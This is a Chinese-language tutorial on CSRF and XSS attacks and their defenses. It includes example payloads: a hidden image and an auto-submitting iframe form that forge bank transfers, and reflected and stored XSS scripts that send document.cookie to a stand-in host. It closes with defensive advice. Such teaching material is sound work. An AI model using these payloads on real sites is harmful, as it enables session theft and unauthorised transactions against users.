# csrf 和 xss

## csrf

> 跨站请求伪造。通过伪造为受信任用户请求受信任的网站。其中 GET 形式可轻易被攻击、POST 接口也可以诱导用户进入带 Form 表单页面是用 POST 方式提交。

### 简单的攻击示例

-   <a href="#诱导GET请求攻击">诱导 GET 请求攻击</a>
-   <a href="#POST攻击">POST 攻击</a>

### 诱导 GET 请求攻击

::: tip
攻击前提:

1. 登录受信任网站 bank.com
2. 受信任网站提供 GET 方式的转账接口: /transfer?toBankID=11&money=100
   :::

```html
<img src="http://bank.com/transfer?toBankID=hacker&money=100" />
```

使用图片的方式可以在用户不知情的情况下直接发起攻击

### POST 攻击

为了应对 GET 请求产生的问题，受信任网站采用 POST 完成操作，表单如下

```html
<form action="/transfer" method="POST">
    <input name="toBankID" />
    <input name="money" />
    <input type="submit" />
</form>
```

::: tip
这种情况下，攻击者可以通过 iframe 的方式进行攻击，如下:
:::

```html
<script>
    function hack() {
        iframe = document.frames['iframe'];
        iframe.document.getElementById('transfer').submit();
    }
</script>
<iframe onload="hack" name="iframe">
    <form
        action="http://bank.com/transfer"
        method="POST"
        name="transfer"
        id="transfer"
    >
        <input name="toBankID" />
        <input name="money" />
        <input type="submit" />
    </form>
</iframe>
```

攻击者通过 iframe 表单进行了 POST 请求，所有攻击方式源于 WEB 的隐式身份验证机制！该身份验证能够保证请求来自用户浏览器，但是不能保证式用户授权发送的。

### 防御

1. 为表单提交增加 csrf-token 用于验证，理论上攻击者无法伪造 csrf-token, 确保发送的表单是用户授权的。（令牌）
2. 规范网络请求，涉及增删改不能使用 GET 请求
3. 检查 Referer
4. 安全性高的页面增加验证码

## xss

> 跨站脚本攻击。恶意注入 Script 代码，达到攻击的目的。

### xss 种类

-   <a href="#DOM BASED">DOM BASED</a>
-   <a href="#存储型">存储型</a>
-   <a href="#反射型">反射型</a>

### 反射型

反射型 XSS 只是简单地把用户输入的数据 “反射” 给浏览器，这种攻击方式往往需要攻击者诱使用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。

可信网站 A.com 有如下 php 页面：

```php
<?php
echo "
        <html>
            <body>
                $_GET["query"]
            </body>
        </html>
      "
?>

```

攻击者可以引导用户打开如下地址:

```txt
http://A.com?query=<script>hack(document.cookie);</script>
```

此时攻击者可以通过任意方式获取用户 cookie，伪造用户登录状态执行非法操作。

### 存储型攻击

受信网站提供持久化存储，如发布文章、发布动态等，但是未过滤用户输入而触发攻击。
如发布以下文章

```html
震惊!!!!!夜里母猪为何惨叫?
<script>
    window.open('www.b.com?param=' + document.cookie);
</script>
```

所有浏览该文章的用户均会收到攻击。

### DOM BASE

基于 DOM 的 XSS 攻击是指通过恶意脚本修改页面的 DOM 结构，是纯粹发生在客户端的攻击。

```html
<h2>XSS:</h2>
<input type="text" id="input" />
<button id="btn">Submit</button>
<div id="div"></div>
<script>
    const input = document.getElementById('input');
    const btn = document.getElementById('btn');
    const div = document.getElementById('div');

    let val;

    input.addEventListener(
        'change',
        e => {
            val = e.target.value;
        },
        false
    );

    btn.addEventListener(
        'click',
        () => {
            div.innerHTML = `<a href=${val}>testLink</a>`;
        },
        false
    );
</script>
```

### 攻防
1. 不要相信用户的任何输入
2. 攻击者的意图主要是获取用于Cookie信息，可以使用HttpOnly防止cookie被劫持
3. 输出检查（变量输出需要转码之后输出到页面中）